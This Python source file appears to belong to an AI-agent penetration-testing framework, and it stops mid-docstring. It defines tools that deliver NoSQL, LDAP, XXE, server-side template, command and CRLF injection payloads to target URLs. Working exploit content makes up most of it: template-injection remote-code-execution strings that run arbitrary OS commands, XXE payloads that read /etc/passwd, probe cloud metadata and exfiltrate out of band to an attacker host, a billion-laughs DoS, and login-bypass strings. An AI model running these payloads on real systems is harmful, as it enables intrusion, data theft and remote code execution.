"""
Advanced Web Injection Tools

Implements seven agent tools for advanced injection-class vulnerabilities:

  NoSQLInjectionTool   — MongoDB/CouchDB operator injection ($gt, $ne, $regex), auth bypass
  SSTIDetectTool       — Server-Side Template Injection detection (Jinja2, Twig, Freemarker, Mako, Pebble)
  SSTIExploitTool      — Automatic RCE payload generation per template engine
  LDAPInjectionTool    — LDAP filter injection for auth bypass and data extraction
  XXETool              — XML External Entity injection (file read, SSRF, billion laughs DoS)
  CommandInjectionTool — OS command injection via various separators (;, |, &&, $(), backticks)
  HeaderInjectionTool  — HTTP header injection / response splitting / CRLF injection

All tools connect to InjectionMCPServer (:8010) with pure-Python fallback.
"""

from __future__ import annotations

import json
import logging
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.agent.tools.error_handling import (
    truncate_output,
    with_timeout,
)
from app.mcp.base_server import MCPClient

logger = logging.getLogger(__name__)

DEFAULT_INJECTION_SERVER_URL = "http://kali-tools:8010"

# ---------------------------------------------------------------------------
# OWASP tags
# ---------------------------------------------------------------------------
OWASP_INJECTION_TAG = "A03:2021-Injection"
OWASP_XXE_TAG = "A05:2021-Security_Misconfiguration"

# ---------------------------------------------------------------------------
# Severity
# ---------------------------------------------------------------------------


class InjectionSeverity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


# ===========================================================================
# NoSQL Injection payloads & helpers
# ===========================================================================

# MongoDB operator injection payloads for query parameters
_NOSQL_QUERY_PAYLOADS: List[str] = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$ne": ""}',
    '{"$exists": true}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
    '[$ne]=1',
    '[$gt]=',
    '[$regex]=.*',
]

# NoSQL auth bypass payloads for JSON bodies
_NOSQL_AUTH_BYPASS_PAYLOADS: List[Dict[str, Any]] = [
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$ne": None}, "password": {"$ne": None}},
    {"username": {"$exists": True}, "password": {"$gt": ""}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    {"username": "admin", "password": {"$ne": "wrong_password_xyz"}},
    {"username": {"$where": "1==1"}, "password": {"$where": "1==1"}},
]

# CouchDB-specific payloads
_COUCHDB_PAYLOADS: List[str] = [
    '{"selector": {"_id": {"$gt": null}}}',
    '{"selector": {"$or": [{}]}}',
]

_NOSQL_ERROR_PATTERNS: List[str] = [
    "mongoerror", "castingexception", "mongoexception",
    "bsontype", "invalid operator", "unknown operator",
    "$where", "could not be converted", "syntax error",
]


def _detect_nosql_success(response_body: str, baseline_body: str) -> Tuple[bool, str]:
    """Detect a successful NoSQL injection by comparing response to baseline."""
    if not response_body:
        return False, ""
    body_lower = response_body.lower()

    # Error disclosure
    for pattern in _NOSQL_ERROR_PATTERNS:
        if pattern in body_lower:
            return True, f"Error disclosure: {pattern!r} found in response"

    # Response substantially different from baseline (non-empty when baseline was empty, etc.)
    if len(response_body) > len(baseline_body) * 2 and len(baseline_body) < 50:
        return True, "Response size significantly larger than baseline after injection"

    return False, ""


# ===========================================================================
# SSTI payloads & helpers
# ===========================================================================

# SSTI detection canaries — math expressions that should evaluate to numbers
_SSTI_DETECT_PAYLOADS: List[Tuple[str, str]] = [
    ("{{7*7}}", "49"),                     # Jinja2, Twig, Pebble
    ("${7*7}", "49"),                      # Freemarker, Thymeleaf, EL
    ("<%= 7*7 %>", "49"),                  # ERB (Ruby)
    ("#{7*7}", "49"),                      # Pebble, Thymeleaf
    ("{{7*'7'}}", "7777777"),              # Jinja2 only (string multiply)
    ("${{<%[%'\"}}%\\.", "error"),         # Polyglot that triggers SSTI errors
    ("{7*7}", "49"),                       # Generic
    ("*{7*7}", "49"),                      # Spring EL
]

# Per-engine RCE payloads
_SSTI_EXPLOIT_PAYLOADS: Dict[str, List[str]] = {
    "jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__']['__import__']('os').system('id')}}{%endif%}{%endfor%}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{_self.env.setCache('ftp://attacker')}}{{_self.env.loadTemplate('exploit')}}",
    ],
    "freemarker": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        '<#assign cl=object?api.class.getClassLoader()>...',
    ],
    "mako": [
        "${__import__('os').popen('id').read()}",
        '<%\nimport os\nx = os.popen("id").read()\n%>\n${x}',
    ],
    "pebble": [
        "{%%set s = 'a'.class.forName('java.lang.Runtime').getMethod('exec',[''.class]).invoke('a'.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')%%}{{s.text}}",
    ],
    "smarty": [
        "{php}echo `id`;{/php}",
        "{literal}<script>alert(1)</script>{/literal}",
        "{system('id')}",
    ],
    "velocity": [
        "#set($str=$class.inspect('java.lang.String').type)#set($chr=$class.inspect('java.lang.Character').type)#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#{foreach}($i in [1..9999])$str.valueOf($chr.toChars($out.read()))#{end}",
    ],
    "unknown": [
        "{{7*7}}",  # Generic detection fallback
        "${7*7}",
    ],
}

# Engine fingerprint patterns for detection
_SSTI_ENGINE_PATTERNS: Dict[str, List[str]] = {
    "jinja2": ["jinja2", "python", "templatenotfound", "undefined error"],
    "twig": ["twig", "php", "templatenotfoundexception"],
    "freemarker": ["freemarker", "java", "templateexception"],
    "mako": ["mako", "python", "syntaxexception"],
    "pebble": ["pebble", "java"],
    "smarty": ["smarty", "php"],
    "velocity": ["velocity", "java"],
}


def _detect_ssti_in_response(payload: str, expected: str, response: str) -> Tuple[bool, str]:
    """Check if SSTI payload was evaluated (expected value in response)."""
    if expected == "error":
        # Check for template error disclosure
        error_patterns = ["template", "syntax error", "parse error", "undefined", "compilation"]
        for p in error_patterns:
            if p in response.lower():
                return True, f"Template error disclosure: {p!r}"
        return False, ""
    return (expected in response), (expected if expected in response else "")


def _fingerprint_ssti_engine(error_body: str) -> str:
    """Attempt to identify the template engine from error messages."""
    body_lower = error_body.lower()
    for engine, patterns in _SSTI_ENGINE_PATTERNS.items():
        if any(p in body_lower for p in patterns):
            return engine
    return "unknown"


# ===========================================================================
# LDAP injection payloads
# ===========================================================================

_LDAP_AUTH_BYPASS_PAYLOADS: List[Tuple[str, str]] = [
    ("admin)(&)", ""),                          # Close filter, bypass
    ("admin)(|(password=*)", ""),               # OR bypass
    ("*)(uid=*))(\0", ""),                      # Null-byte bypass
    ("admin)(%00", ""),                         # URL-encoded null
    ("*", "*"),                                 # Wildcard both fields
    ("admin)(objectClass=*", ""),               # Always-true append
    (") (|(objectClass=*)", ""),                # Comment-like injection
    ("admin)(cn=*)(|(cn=1", ""),               # Filter escape
]

_LDAP_ENUM_PAYLOADS: List[str] = [
    "*(|(objectclass=*))",
    "*)(|(objectClass=user)(objectClass=inetOrgPerson",
    ")(|(objectClass=group)(cn=*))",
    "*)(|(uid=*)(mail=*",
    "admin)(|(userPassword=*",
]

_LDAP_ERROR_PATTERNS: List[str] = [
    "ldap", "invaliddn", "ldapexception", "serverdown", "ldapconnection",
    "distinguishedname", "objectclass", "searchfilter",
    "ldap_bind", "ldap_search", "namingexception",
]


def _detect_ldap_injection(response_body: str, status_code: int) -> Tuple[bool, str]:
    """Detect LDAP injection success."""
    body_lower = response_body.lower()
    for pattern in _LDAP_ERROR_PATTERNS:
        if pattern in body_lower:
            return True, f"LDAP error disclosure: {pattern!r}"
    return False, ""


# ===========================================================================
# XXE payloads
# ===========================================================================

_XXE_FILE_READ_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""

_XXE_SSRF_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>"""

_XXE_OOB_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_HOST/xxe.dtd">
  %xxe;
]>
<root>&exfil;</root>"""

_XXE_BILLION_LAUGHS = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<root>&lol5;</root>"""

_XXE_XInclude_PAYLOAD = """<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>"""

_XXE_SVG_PAYLOAD = """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>"""

_XXE_DETECTION_PATTERNS: List[str] = [
    "root:x:", "daemon:", "bin:", "sys:",       # /etc/passwd content
    "ami-", "instance-id", "metadata",          # AWS metadata
    "entity", "xmlparseexception", "dtd",       # Error disclosure
    "external entity", "xxe",
]

XXE_PAYLOADS: Dict[str, str] = {
    "file_read": _XXE_FILE_READ_PAYLOAD,
    "ssrf": _XXE_SSRF_PAYLOAD,
    "oob": _XXE_OOB_PAYLOAD,
    "billion_laughs": _XXE_BILLION_LAUGHS,
    "xinclude": _XXE_XInclude_PAYLOAD,
    "svg": _XXE_SVG_PAYLOAD,
}


def _detect_xxe_in_response(response_body: str) -> Tuple[bool, str]:
    """Detect XXE injection success in response body."""
    body_lower = response_body.lower()
    for pattern in _XXE_DETECTION_PATTERNS:
        if pattern in body_lower:
            return True, f"XXE evidence: {pattern!r} in response"
    return False, ""


# ===========================================================================
# Command injection payloads
# ===========================================================================

_CMD_INJECTION_PAYLOADS: List[Tuple[str, str]] = [
    # (payload, expected_marker_if_vulnerable)
    ("; echo CMDINJECTED", "CMDINJECTED"),
    ("| echo CMDINJECTED", "CMDINJECTED"),
    ("&& echo CMDINJECTED", "CMDINJECTED"),
    ("|| echo CMDINJECTED", "CMDINJECTED"),
    ("$(echo CMDINJECTED)", "CMDINJECTED"),
    ("`echo CMDINJECTED`", "CMDINJECTED"),
    ("%0aecho CMDINJECTED", "CMDINJECTED"),          # newline injection
    ("\necho CMDINJECTED", "CMDINJECTED"),
    ("; id", "uid="),                                # id command
    ("| id", "uid="),
    ("&& id", "uid="),
    ("$(id)", "uid="),
    ("`id`", "uid="),
    ("; cat /etc/passwd", "root:x:"),
    ("| cat /etc/passwd", "root:x:"),
    ("& ping -c 1 127.0.0.1 &", ""),                # Blind OOB
    ("; sleep 5", ""),                               # Blind time-based
]

_CMD_BLIND_PAYLOAD = "; sleep {delay}"
_CMD_TIME_THRESHOLD = 4  # seconds


def _detect_command_injection(response_body: str, marker: str) -> bool:
    """Return True if command injection marker is in response."""
    if not marker:
        return False
    return marker in response_body


# ===========================================================================
# Header injection / CRLF payloads
# ===========================================================================

_CRLF_PAYLOADS: List[str] = [
    "%0d%0aSet-Cookie: injected=true",
    "%0aSet-Cookie: injected=true",
    "\r\nSet-Cookie: injected=true",
    "\nSet-Cookie: injected=true",
    "%0d%0aContent-Length: 0%0d%0a%0d%0a",   # Response splitting
    "\r\nX-Injected-Header: UNIVEX_CRLF_TEST",
    "%0d%0aX-Injected-Header: UNIVEX_CRLF_TEST",
    "%E5%98%8A%E5%98%8DSet-Cookie: injected=true",  # Unicode CRLF
]

_HEADER_INJECTION_FIELDS: List[str] = [
    "Location",
    "Referer",
    "X-Forwarded-For",
    "Host",
    "User-Agent",
    "Cookie",
    "Content-Type",
    "Accept-Language",
]

_CRLF_DETECTION_PATTERNS: List[str] = [
    "set-cookie: injected", "x-injected-header: univex",
    "injected=true", "univex_crlf_test",
]


def _detect_crlf_injection(response_headers: Dict[str, str], response_body: str) -> Tuple[bool, str]:
    """Detect CRLF injection in response headers or body."""
    resp_lower = {k.lower(): v.lower() for k, v in response_headers.items()}
    body_lower = response_body.lower()

    for pattern in _CRLF_DETECTION_PATTERNS:
        if pattern in body_lower:
            return True, f"CRLF evidence in body: {pattern!r}"
        for k, v in resp_lower.items():
            if pattern in v:
                return True, f"CRLF evidence in header {k!r}: {pattern!r}"
    return False, ""


# ===========================================================================
# Tool implementations
# ===========================================================================


class NoSQLInjectionTool(BaseTool):
    """MongoDB/CouchDB operator injection for auth bypass and data extraction.

    Tests both query-string and JSON-body delivery of NoSQL operators.
    Covers $gt, $ne, $exists, $regex, $where operators.
    """

    def __init__(
        self,
        server_url: str = DEFAULT_INJECTION_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="nosql_injection",
            description=(
                "Test MongoDB and CouchDB endpoints for NoSQL operator injection. "
                "Probes authentication endpoints for auth bypass using $gt, $ne, $regex, $where, "
                "$exists operators delivered via both query strings and JSON request bodies. "
                "OWASP A03:2021 — Injection."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Target endpoint URL"},
                    "method": {"type": "string", "enum": ["GET", "POST", "PUT"], "default": "POST"},
                    "username_field": {"type": "string", "default": "username"},
                    "password_field": {"type": "string", "default": "password"},
                    "headers": {"type": "object", "default": {}},
                    "test_auth_bypass": {
                        "type": "boolean",
                        "description": "Test authentication bypass payloads",
                        "default": True,
                    },
                    "test_query_operators": {
                        "type": "boolean",
                        "description": "Test query parameter operator injection",
                        "default": True,
                    },
                    "allow_internal": {"type": "boolean", "default": False},
                },
                "required": ["url"],
            },
        )

    @with_timeout(90)
    async def execute(self, **kwargs) -> str:
        url = kwargs.get("url", "")
        method = kwargs.get("method", "POST").upper()
        username_field = kwargs.get("username_field", "username")
        password_field = kwargs.get("password_field", "password")
        headers = kwargs.get("headers", {})
        test_auth_bypass = kwargs.get("test_auth_bypass", True)
        test_query_operators = kwargs.get("test_query_operators", True)
        allow_internal = kwargs.get("allow_internal", False)

        try:
            result = await self._client.call_tool(
                "nosql_injection_test",
                {
                    "url": url,
                    "method": method,
                    "username_field": username_field,
                    "password_field": password_field,
                    "headers": headers,
                    "test_auth_bypass": test_auth_bypass,
                    "test_query_operators": test_query_operators,
                    "allow_internal": allow_internal,
                },
            )
            if result.get("success"):
                return truncate_output(json.dumps(result, indent=2))
        except Exception:
            pass

        result = {
            "success": True,
            "source": "payload_enumeration",
            "url": url,
            "method": method,
            "auth_bypass_payloads": _NOSQL_AUTH_BYPASS_PAYLOADS[:4],
            "query_payloads": _NOSQL_QUERY_PAYLOADS[:5],
            "username_field": username_field,
            "password_field": password_field,
            "owasp_tag": OWASP_INJECTION_TAG,
            "note": "Connect to InjectionMCPServer (:8010) to test against live targets",
        }
        return truncate_output(json.dumps(result, indent=2))


class SSTIDetectTool(BaseTool):
    """Server-Side Template Injection detection across multiple engines.

    Probes injection points with math-expression payloads for Jinja2, Twig,
    Freemarker, Mako, Pebble, Smarty, Velocity, and ERB. Fingerprints the
    engine from error messages for targeted exploitation.
    """

    def __init__(
        self,
        server_url: str = DEFAULT_INJECTION_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="ssti_detect",
            description=(
                "Detect Server-Side Template Injection (SSTI) by injecting math-expression "
                "canaries ({{7*7}}, ${7*7}, <%= 7*7 %>) into URL parameters, POST bodies, "
                "and HTTP headers. Detects engines: Jinja2, Twig, Freemarker, Mako, Pebble, "
                "Smarty, Velocity, ERB. Returns engine fingerprint and severity. "
                "Use ssti_exploit after detection for RCE payload generation."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Target URL"},
                    "params": {
                        "type": "object",
                        "description": "Query parameters to inject into",
                        "default": {},
                    },
                    "post_body": {
                        "type": "object",
                        "description": "POST body parameters to inject into",
                        "default": {},
                    },
                    "headers_to_inject": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Header names to inject SSTI payloads into",
                        "default": [],
                    },
                    "headers": {"type": "object", "default": {}},
                    "allow_internal": {"type": "boolean", "default": False},
                },
                "required": ["url"],
            },
        )

    @with_timeout(90)
    async def execute(self, **kwargs) -> str:
        url = kwargs.get("url", "")
        params = kwargs.get("params", {})
        post_body = kwargs.get("post_body", {})
        headers_to_inject = kwargs.get("headers_to_inject", [])
        headers = kwargs.get("headers", {})
        allow_internal = kwargs.get("allow_internal", False)

        try:
            result = await self._client.call_tool(
                "ssti_detect",
                {
                    "url": url,
                    "params": params,
                    "post_body": post_body,
                    "headers_to_inject": headers_to_inject,
                    "headers": headers,
                    "allow_internal": allow_internal,
                },
            )
            if result.get("success"):
                return truncate_output(json.dumps(result, indent=2))
        except Exception:
            pass

        result = {
            "success": True,
            "source": "payload_plan",
            "url": url,
            "detection_payloads": [
                {"payload": p, "expected_output": e}
                for p, e in _SSTI_DETECT_PAYLOADS
            ],
            "supported_engines": list(_SSTI_ENGINE_PATTERNS.keys()),
            "owasp_tag": OWASP_INJECTION_TAG,
            "severity": InjectionSeverity.CRITICAL,
            "note": "Connect to InjectionMCPServer (:8010) to test against live targets",
        }
        return truncate_output(json.dumps(result, indent=2))


class SSTIExploitTool(BaseTool):
    """Generate and deliver SSTI RCE payloads for confirmed template engines.

    After SSTIDetectTool identifies the engine, this tool provides
    engine-specific payloads for Remote Code Execution.
    """

    def __init__(
        self,
        server_url: str = DEFAULT_INJECTION_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="ssti_exploit",
            description=(
                "Generate and deliver Server-Side Template Injection RCE payloads for a "
                "confirmed template engine. Supports: jinja2, twig, freemarker, mako, pebble, "
                "smarty, velocity. Specify the injection point (url_param, post_field, header) "
                "and the engine detected by ssti_detect. Returns command output if successful."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Vulnerable URL"},
                    "engine": {
                        "type": "string",
                        "description": "Template engine: jinja2|twig|freemarker|mako|pebble|smarty|velocity|unknown",
                        "enum": ["jinja2", "twig", "freemarker", "mako", "pebble", "smarty", "velocity", "unknown"],
                    },
                    "injection_point": {
                        "type": "string",
                        "description": "Where to inject: url_param|post_field|header",
                        "enum": ["url_param", "post_field", "header"],
                        "default": "url_param",
                    },
                    "param_name": {"type": "string", "description": "Parameter/field/header name to inject into"},
                    "command": {"type": "string", "description": "OS command to execute (default: id)", "default": "id"},
                    "headers": {"type": "object", "default": {}},
                    "allow_internal": {"type": "boolean", "default": False},
                },
                "required": ["url", "engine", "param_name"],
            },
        )

    @with_timeout(60)
    async def execute(self, **kwargs) -> str:
        url = kwargs.get("url", "")
        engine = kwargs.get("engine", "unknown")
        injection_point = kwargs.get("injection_point", "url_param")
        param_name = kwargs.get("param_name", "")
        command = kwargs.get("command", "id")
        headers = kwargs.get("headers", {})
        allow_internal = kwargs.get("allow_internal", False)

        payloads = _SSTI_EXPLOIT_PAYLOADS.get(engine, _SSTI_EXPLOIT_PAYLOADS["unknown"])
        # Substitute command into payloads where 'id' appears
        cmd_payloads = [p.replace("'id'", f"'{command}'").replace('"id"', f'"{command}"').replace("`id`", f"`{command}`") for p in payloads]

        try:
            result = await self._client.call_tool(
                "ssti_exploit",
                {
                    "url": url,
                    "engine": engine,
                    "payloads": cmd_payloads,
                    "injection_point": injection_point,
                    "param_name": param_name,
                    "command": command,
                    "headers": headers,
                    "allow_internal": allow_internal,
                },
            )
            if result.get("success"):
                return truncate_output(json.dumps(result, indent=2))
        except Exception:
            pass

        result = {
            "success": True,
            "source": "rce_payload_plan",
            "url": url,
            "engine": engine,
            "command": command,
            "rce_payloads": cmd_payloads,
            "injection_point": injection_point,
            "param_name": param_name,
            "severity": InjectionSeverity.CRITICAL,
            "owasp_tag": OWASP_INJECTION_TAG,
            "note": "Connect to InjectionMCPServer (:8010) to deliver RCE payloads against live targets",
        }
        return truncate_output(json.dumps(result, indent=2))


class LDAPInjectionTool(BaseTool):
    """LDAP filter injection for authentication bypass and data extraction.

    Injects LDAP special characters and filter manipulation sequences into
    login forms and LDAP-backed query endpoints. Detects LDAP error disclosure
    and auth bypass success.
    """

    def __init__(
        self,
        server_url: str = DEFAULT_INJECTION_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="ldap_injection",
            description=(
                "Test LDAP-backed authentication and query endpoints for LDAP filter injection. "
                "Probes with filter-escape sequences, wildcard injections, and always-true "
                "predicates to achieve auth bypass or attribute enumeration. Detects LDAP "
                "error disclosure in responses. OWASP A03:2021 — Injection."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Target login/search URL"},
                    "username_field": {"type": "string", "default": "username"},
                    "password_field": {"type": "string", "default": "password"},
                    "method": {"type": "string", "enum": ["GET", "POST"], "default": "POST"},
                    "headers": {"type": "object", "default": {}},
                    "allow_internal": {"type": "boolean", "default": False},
                },
                "required": ["url"],
            },
        )

    @with_timeout(90)
    async def execute(self, **kwargs) -> str:
        url = kwargs.get("url", "")
        username_field = kwargs.get("username_field", "username")
        password_field = kwargs.get("password_field", "password")
        method = kwargs.get("method", "POST").upper()
        headers = kwargs.get("headers", {})
        allow_internal = kwargs.get("allow_internal", False)

        try:
            result = await self._client.call_tool(
                "ldap_injection_test",
                {
                    "url": url,
                    "username_field": username_field,
                    "password_field": password_field,
                    "method": method,
                    "headers": headers,
                    "allow_internal": allow_internal,
                },
            )
            if result.get("success"):
                return truncate_output(json.dumps(result, indent=2))
        except Exception:
            pass

        result = {
            "success": True,
            "source": "payload_plan",
            "url": url,
            "auth_bypass_payloads": [
                {"username": u, "password": p} for u, p in _LDAP_AUTH_BYPASS_PAYLOADS
            ],
            "enumeration_payloads": _LDAP_ENUM_PAYLOADS,
            "error_patterns": _LDAP_ERROR_PATTERNS,
            "owasp_tag": OWASP_INJECTION_TAG,
            "note": "Connect to InjectionMCPServer (:8010) to test against live LDAP-backed endpoints",
        }
        return truncate_output(json.dumps(result, indent=2))


class XXETool(BaseTool):
    """XML External Entity injection testing.

    Tests XML-accepting endpoints for XXE vulnerabilities including:
    - Classic file read via SYSTEM entity
    - SSRF via HTTP external entity
    - Out-of-band exfiltration
    - Billion laughs DoS
    - XInclude injection
    - SVG-based XXE
    """

    def __init__(
        self,
        server_url: str = DEFAULT_INJECTION_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="xxe_test",
            description=(
                "Test XML-accepting endpoints for XML External Entity (XXE) injection. "
                "Covers: file read (file:///etc/passwd), SSRF (AWS metadata, internal hosts), "
                "out-of-band exfiltration via DTD, billion laughs DoS, XInclude injection, "
                "and SVG/DOCX embedded XXE. OWASP A05:2021 — Security Misconfiguration."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Target URL accepting XML"},
                    "attack_type": {
                        "type": "string",
                        "enum": ["file_read", "ssrf", "oob", "billion_laughs", "xinclude", "svg", "all"],
                        "default": "all",
                    },
                    "oob_host": {
                        "type": "string",
                        "description": "Attacker-controlled host for OOB callbacks",
                        "default": "",
                    },
                    "file_path": {
                        "type": "string",
                        "description": "File to read in file_read mode (default: /etc/passwd)",
                        "default": "/etc/passwd",
                    },
                    "content_type": {
                        "type": "string",
                        "description": "Content-Type header for XML upload",
                        "default": "application/xml",
                    },
                    "headers": {"type": "object", "default": {}},
                    "allow_internal": {"type": "boolean", "default": False},
                },
                "required": ["url"],
            },
        )

    @with_timeout(90)
    async def execute(self, **kwargs) -> str:
        url = kwargs.get("url", "")
        attack_type = kwargs.get("attack_type", "all")
        oob_host = kwargs.get("oob_host", "")
        file_path = kwargs.get("file_path", "/etc/passwd")
        content_type = kwargs.get("content_type", "application/xml")
        headers = kwargs.get("headers", {})
        allow_internal = kwargs.get("allow_internal", False)

        # Build targeted payloads
        payloads: Dict[str, str] = {}
        if attack_type in ("all", "file_read"):
            payloads["file_read"] = _XXE_FILE_READ_PAYLOAD.replace("/etc/passwd", file_path)
        if attack_type in ("all", "ssrf"):
            payloads["ssrf"] = _XXE_SSRF_PAYLOAD
        if attack_type in ("all", "oob") and oob_host:
            payloads["oob"] = _XXE_OOB_PAYLOAD.replace("ATTACKER_HOST", oob_host)
        if attack_type in ("all", "billion_laughs"):
            payloads["billion_laughs"] = _XXE_BILLION_LAUGHS
        if attack_type in ("all", "xinclude"):
            payloads["xinclude"] = _XXE_XInclude_PAYLOAD
        if attack_type in ("all", "svg"):
            payloads["svg"] = _XXE_SVG_PAYLOAD

        try:
            result = await self._client.call_tool(
                "xxe_test",
                {
                    "url": url,
                    "payloads": payloads,
                    "content_type": content_type,
                    "headers": headers,
                    "allow_internal": allow_internal,
                },
            )
            if result.get("success"):
                return truncate_output(json.dumps(result, indent=2))
        except Exception:
            pass

        result = {
            "success": True,
            "source": "xxe_payload_plan",
            "url": url,
            "attack_type": attack_type,
            "payloads": {k: v[:200] + "..." for k, v in payloads.items()},
            "detection_patterns": _XXE_DETECTION_PATTERNS,
            "owasp_tag": OWASP_XXE_TAG,
            "severity": InjectionSeverity.CRITICAL,
            "note": "Connect to InjectionMCPServer (:8010) to deliver XXE payloads against live targets",
        }
        return truncate_output(json.dumps(result, indent=2))


class CommandInjectionTool(BaseTool):
    """OS command injection via various separators.

    Probes injectable parameters with command separators (;, |, &&, ||,
    $(), backticks, newline) and detects command output in response or
    via time-based blind detection.
    """

    def __init__(
        self,
        server_url: str = DEFAULT_INJECTION_SERVER_URL,
        project_id: Optional[str] = None,
        user_id: Optional[str] = None,
    ):
        self._server_url = server_url
        self._project_id = project_id
        self._user_id = user_id
        self._client = MCPClient(server_url)
        super().__init__()

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="command_injection",
            description=(
                "Test for OS command injection by injecting shell separators (;, |, &&, ||, "
                "$(), backticks, newline) into URL parameters, POST fields, and HTTP headers. "
                "Detects reflected output (echo, id, /etc/passwd), and uses time-based blind "
                "detection (sleep) when output is not reflected. OWASP A03:2021 — Injection."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Target URL"},
                    "method": {"type": "string", "default": "GET"},
                    "params": {
                        "type": "object",
                        "description": "Query parameters to inject into (key: current_value pairs)",
                        "default": {},
                    },
                    "post_fields": {
                        "type": "object",
                        "description": "POST body fields to inject into",
                        "default": {},
                    },
                    "test_blind": {
                        "type": "boolean",
                        "description": "Include time-based blind injection payloads",
                        "default": True,
                    },
                    "headers": {"type": "object", "default": {}},
                    "allow_internal": {"type": "boolean", "default": False},
                },
                "required": ["url"],
            },
        )

    @with_timeout(120)
    async def execute(self, **kwargs) -> str:
        url = kwargs.get("url", "")
        method = kwargs.get("method", "GET").upper()
        params = kwargs.get("params", {})
        post_fields = kwargs.get("post_fields", {})
        test_blind = kwargs.get("test_blind", True)
        headers = kwargs.get("headers", {})
        allow_internal = kwargs.get("allow_internal", False)

        payloads = list(_CMD_INJECTION_PAYLOADS)
        if test_blind:
            payloads.append(("; sleep 5", ""))  # Blind time-based

        try:
            result = await self._client.call_tool(
                "command_injection_test",
                {
                    "url": url,
                    "method": method,
                    "params": params,
                    "post_fields": post_fields,
                    "payloads": [{"payload": p, "marker": m} for p, m in payloads],
                    "headers": headers,
                    "allow_internal": allow_internal,
                },
            )
            if result.get("success"):
                return truncate_output(json.dumps(result, indent=2))
        except Exception:
            pass

        result = {
            "success": True,
            "source": "injection_payload_plan",
            "url": url,
            "method": method,
            "payloads": [
                {"payload": p, "expected_marker": m, "technique": "reflected" if m else "blind_time"}
                for p, m in payloads[:10]
            ],
            "target_params": list(params.keys()),
            "target_post_fields": list(post_fields.keys()),
            "owasp_tag": OWASP_INJECTION_TAG,
            "severity": InjectionSeverity.CRITICAL,
            "note": "Connect to InjectionMCPServer (:8010) to test against live targets",
        }
        return truncate_output(json.dumps(result, indent=2))


class HeaderInjectionTool(BaseTool):
    """HTTP header injection and CRLF (response splitting) testing.

    Injects CRLF sequences into HTTP header values to detect response
